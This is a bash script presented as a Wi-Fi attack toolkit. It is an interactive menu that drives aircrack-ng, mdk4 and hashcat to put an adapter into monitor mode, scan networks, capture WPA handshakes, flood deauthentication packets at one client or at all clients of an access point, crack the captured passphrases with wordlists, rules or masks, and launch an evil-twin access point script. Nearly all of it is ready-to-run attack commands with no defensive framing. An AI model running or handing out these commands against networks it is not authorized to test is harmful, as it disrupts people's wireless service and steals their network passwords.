
echo -e "\033[1;35m"
echo "██╗    ██╗██╗███████╗██╗    █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗"
echo "██║    ██║██║██╔════╝██║   ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝"
echo "██║ █╗ ██║██║█████╗  ██║   ███████║   ██║      ██║   ███████║██║     █████╔╝ "
echo "██║███╗██║██║██╔══╝  ██║   ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗ "
echo "╚███╔███╔╝██║██║     ██║██╗██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗"
echo " ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝╚═╝╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝"
echo -e "              \033[1;36mWIFI ✦ ATTACK-Wi-Fi Pentesting Toolkit"
echo ""
sleep 2

#!/bin/bash

# === Main Configuration ===
INTERFACE="wlan0"
DRIVER_GITHUB="https://github.com/aircrack-ng/rtl8812au.git"

install_kernel_headers() {
    echo "[+] Installing Linux Kernel Headers..."
    sudo apt update
    sudo apt install -y linux-headers-$(uname -r)
    echo "[+] Kernel Headers installed successfully!"
}

setup_wifi_adapter() {
    echo "[+] Installing Wi-Fi Adapter Driver..."
    sudo apt update
    sudo apt install -y dkms git build-essential
    install_kernel_headers
    git clone $DRIVER_GITHUB
    cd rtl8812au || exit
    sudo make clean
    sudo make
    sudo make install
    cd ..
    rm -rf rtl8812au
    echo "[+] Driver installed successfully!"
    echo "[+] Reloading Wi-Fi Adapter..."
    sudo modprobe 88XXau
    sudo ip link set $INTERFACE up
    echo "[+] Wi-Fi Adapter is now active!"
}

turn_on_monitor_mode() {
    echo "[+] Turning on Monitor Mode..."
    sudo airmon-ng start $INTERFACE
    sudo ip link set $INTERFACE down
    sudo iw dev $INTERFACE set type monitor
    sudo ip link set $INTERFACE up
    echo "[+] Monitor Mode enabled on $INTERFACE"
}

check_wifi_interface() {
    echo "[+] Checking available Wi-Fi interfaces..."
    iwconfig
}

scan_wifi() {
    echo "[+] Scanning for Wi-Fi networks (2.4GHz & 5GHz)..."
    sudo airodump-ng --band abg $INTERFACE
}

scan_specific_wifi() {
    read -p "[?] Enter BSSID: " BSSID
    read -p "[?] Enter Channel: " CH
    echo "[+] Scanning specific Wi-Fi ($BSSID) on channel ($CH)"
    sudo iwconfig $INTERFACE channel $CH
    sudo airodump-ng --band abg --bssid $BSSID -c $CH -w capture $INTERFACE
}

change_channel() {
    read -p "[?] Enter the channel number: " CHANNEL
    echo "[+] Changing channel to $CHANNEL..."
    sudo iwconfig $INTERFACE channel $CHANNEL
    echo "[+] Channel changed to $CHANNEL"
}

deauth_client() {
    read -p "[?] Enter BSSID of target AP: " BSSID
    read -p "[?] Enter MAC Address of target client: " CLIENT

    echo "[1] aireplay-ng"
    echo "[2] mdk4 "
    read -p "[?] Select method: " METHOD

    if [ "$METHOD" = "1" ]; then
        read -p "[?] Enter number of deauth packets to send (e.g., 100): " COUNT
        echo "[+] Sending Deauthentication Attack ($COUNT packets) to $CLIENT on $BSSID..."
        sudo aireplay-ng -0 $COUNT -a $BSSID -c $CLIENT $INTERFACE
    elif [ "$METHOD" = "2" ]; then
        echo "[+] Sending Deauthentication Attack to all clients on $BSSID using mdk4..."
        sudo mdk4 $INTERFACE d -B $BSSID
    else
        echo "[-] Invalid method selected!"
    fi
}

deauth_all_clients() {
    read -p "[?] Enter BSSID of target AP: " BSSID 
    echo "[1] aireplay-ng"
    echo "[2] mdk4"
    read -p "[?] Select method: " METHOD
    if [ "$METHOD" = "1" ]; then
        read -p "[?] Enter number of deauth packets to send (e.g., 100): " COUNT
        echo "[+] Sending Deauthentication Attack ($COUNT packets) to all clients on $BSSID..."
        sudo aireplay-ng -0 $COUNT -a $BSSID $INTERFACE
    elif [ "$METHOD" = "2" ]; then
        echo "[+] Sending Deauthentication Attack to all clients on $BSSID using mdk4..."
        sudo mdk4 $INTERFACE d -B $BSSID
    else
        echo "[-] Invalid method selected!"
    fi
}

capture_handshake() {
    read -p "[?] Enter BSSID of target AP: " BSSID
    read -p "[?] Enter Channel: " CH
    echo "[+] Setting channel to $CH and starting capture..."
    sudo iwconfig $INTERFACE channel $CH
    sudo airodump-ng --bssid $BSSID -c $CH --write handshake $INTERFACE
}

crack_password() {
    echo "[+] Select cracking method:"
    echo "1) Dictionary Attack (rockyou.txt)"
    echo "2) Dictionary Attack (custom.txt)"
    echo "3) Rule-Based Attack"
    echo "4) Mask Attack"
    read -p "[?] Enter method: " METHOD

    if [ "$METHOD" = "1" ]; then
        echo "[+] Available .22000 files:"
        ls *.22000 2>/dev/null || echo "[-] No .22000 files found."
        
        read -p "[?] Enter .22000 filename (default: handshake.22000): " FILE
        FILE=${FILE:-handshake.22000}
        echo "[+] Cracking using rockyou.txt..."
        hashcat -m 22000 $FILE -a 0 /usr/share/wordlists/rockyou.txt --force -w 3 --status

    elif [ "$METHOD" = "2" ]; then
        echo "[+] Available .22000 files:"
        ls *.22000 2>/dev/null || echo "[-] No .22000 files found."
        
        read -p "[?] Enter .22000 filename (default: handshake.22000): " FILE
        FILE=${FILE:-handshake.22000}
        read -p "[?] Enter path to custom wordlist: " WORDLIST
        echo "[+] Cracking using custom wordlist ($WORDLIST)..."
        hashcat -m 22000 $FILE -a 0 $WORDLIST --force -w 3 --status

    elif [ "$METHOD" = "3" ]; then
        echo "[+] Available .22000 files:"
        ls *.22000 2>/dev/null || echo "[-] No .22000 files found."
        
        read -p "[?] Enter .22000 filename (default: handshake.22000): " FILE
        FILE=${FILE:-handshake.22000}
        read -p "[?] Enter path to dictionary: " DICT
        echo "[+] Using rule-based attack with best64.rule..."
        hashcat -m 22000 $FILE -a 0 $DICT -r /usr/share/hashcat/rules/best64.rule --force -w 3 --status

    elif [ "$METHOD" = "4" ]; then
        echo "[+] Available .22000 files:"
        ls *.22000 2>/dev/null || echo "[-] No .22000 files found."
        
        read -p "[?] Enter .22000 filename (default: handshake.22000): " FILE
        FILE=${FILE:-handshake.22000}
        echo "[+] Mask Attack Mode"
        echo "\nMask Legend:"
        echo "  ?l = lowercase a-z"
        echo "  ?u = uppercase A-Z"
        echo "  ?d = digits 0-9"
        echo "  ?s = symbols"
        echo "  ?a = all of the above"
        echo "\nExample:"
        echo "  P_R@@tHands@me => Mask => P_R@@tHand?l?s?l?l"
        read -p "[?] Enter mask pattern: " MASK
        hashcat -m 22000 $FILE -a 3 $MASK --force -w 3 --status

    else
        echo "[-] Invalid method selected."
    fi
}

show_cracked_password() {
    echo "[+] Available .22000 files:"
    ls *.22000 2>/dev/null || echo "[-] No .22000 files found."
    read -p "[?] Enter .22000 filename (default: handshake.22000): " FILE
    FILE=${FILE:-handshake.22000}
    hashcat -m 22000 $FILE --show
}


convert_to_22000() {
    echo "[+] Available .cap files:"
    ls *.cap 2>/dev/null || echo "[-] No .cap files found."
    read -p "[?] Enter .cap filename (default: handshake.cap): " CAPFILE
    CAPFILE=${CAPFILE:-handshake.cap}
    read -p "[?] Enter output .22000 filename (default: handshake.22000): " OUTFILE
    OUTFILE=${OUTFILE:-handshake.22000}
    hcxpcapngtool -o $OUTFILE $CAPFILE
    echo "[+] File converted to $OUTFILE"
}


disable_network_manager() {
    echo "[+] Disabling Network Manager..."
    sudo airmon-ng check kill
    echo "[+] Network Manager disabled!"
}

enable_network_manager() {
    echo "[+] Enabling Network Manager..."
    sudo systemctl restart NetworkManager
    sudo systemctl restart networking
    echo "[+] Network Manager enabled! Internet should be back online."
}

evil_twin_attack() {
    echo "[+] Running Evil Twin Attack Script..."
    chmod +x ./evil-twin-attack/start-evil-twin.sh
    sudo ./evil-twin-attack/start-evil-twin.sh
}
stop_evil_twin() {
    echo "[+] Stopping Evil Twin Services..."
    sudo pkill hostapd
    sudo pkill dnsmasq
    sudo pkill python3
    sudo systemctl start NetworkManager
    echo "Evil Twin Services Stopped and NetworkManager Restored!"
}

# === Menu UI ===
while true; do
    echo -e "\033[1;36m====================================\033[0m"
    echo -e "\033[1;33m        Wi-Fi Attack Toolkit        \033[0m"
    echo -e "\033[1;36m====================================\033[0m"

    echo -e "\n\033[1;34m[ Setup & Configuration ]\033[0m"
    echo "1)  Setup Wi-Fi Adapter"
    echo "2)  Install Kernel Headers"
    echo "3)  Check Wi-Fi Interface"
    echo "4)  Turn on Monitor Mode"
    echo "5)  Disable Network Manager"
    echo "6)  Enable Network Manager"

    echo -e "\n\033[1;34m[ Scanning & Targeting ]\033[0m"
    echo "7)  Scan for Wi-Fi Networks"
    echo "8)  Scan Specific Wi-Fi"
    echo "9)  Change Wi-Fi Channel"

    echo -e "\n\033[1;34m[ Attack & Capture ]\033[0m"
    echo "10) Capture WPA Handshake"
    echo "11) Deauth Specific Client"
    echo "12) Deauth All Clients"

    echo -e "\n\033[1;34m[ Cracking & Analysis ]\033[0m"
    echo "13) Convert .cap to .22000"
    echo "14) Crack WPA Password"
    echo "15) Show Cracked Password"

    echo "\n\033[1;34m[ Evil Twin Attack ]\033[0m"
    echo "16) Start Evil Twin Attack"
    echo "17) Stop Evil Twin Attack"

    echo "\n\033[1;31m18) Exit\033[0m"
    echo "===================================="
    read -p "[?] Select an option: " OPTION

    case $OPTION in
        1) setup_wifi_adapter ;;
        2) install_kernel_headers ;;
        3) check_wifi_interface ;;
        4) turn_on_monitor_mode ;;
        5) disable_network_manager ;;
        6) enable_network_manager ;;
        7) scan_wifi ;;
        8) scan_specific_wifi ;;
        9) change_channel ;;
        10) capture_handshake ;;
        11) deauth_client ;;
        12) deauth_all_clients ;;
        13) convert_to_22000 ;;
        14) crack_password ;;
        15) show_cracked_password ;;
        16) evil_twin_attack ;;
        17) stop_evil_twin ;;
        18) echo "[+] Exiting..."; exit 0 ;;
        *) echo "[-] Invalid option! Try again." ;;
    esac
done
